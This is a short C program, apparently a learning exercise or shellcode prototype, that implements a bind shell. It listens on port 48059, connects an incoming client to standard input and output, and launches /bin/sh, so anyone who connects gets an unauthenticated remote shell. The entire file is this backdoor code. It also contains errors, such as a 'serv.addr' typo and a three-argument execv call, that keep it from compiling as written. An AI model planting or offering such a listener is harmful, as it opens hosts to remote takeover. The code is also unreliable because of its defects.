#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/socket.h> // libraries used for use a socket 
#include <netinet/in.h> // define the structure of sockaddr

int main()
{
    char *shell[12]; // prepare the call of execv
    int server, client; // file descriptor 
    struct sockaddr_in serv_addr; //structure that saves the values oof the IP and port

    server = socket(2, 1, 0); // create a socket of local IP by type of source 
    serv.addr.sin_addr.s_addr = 0; // configure the addresses of socket as all locals 
    serv_addr.sin_port=0xBBBB; // configure the port of socket 48059 here 
    serv_addr.sin_family=2;   //configure the port familyof native protocol: IP

    bind(server,(struct sockaddr *)&serv_addr,0x10); // to join socket
    listen(server, 0); //to add the listen state, wait at a conexion
    client=accept(server,0,0);// when connect it, return the clien descriptor

    /*connect the canlization of client in stdin,stdout and stderr */
    dup2(client,0); //connect stdin at the client 
    dup2(client,1); // connect stdout at the client 
    dup2(client,2); // connect stderr at the client 
    shell[0]="/bin/sh"; // 1st argument of of execv
    shell[1]=0;         // end matrix with null
    execv(shell[0],shell,0); 
}
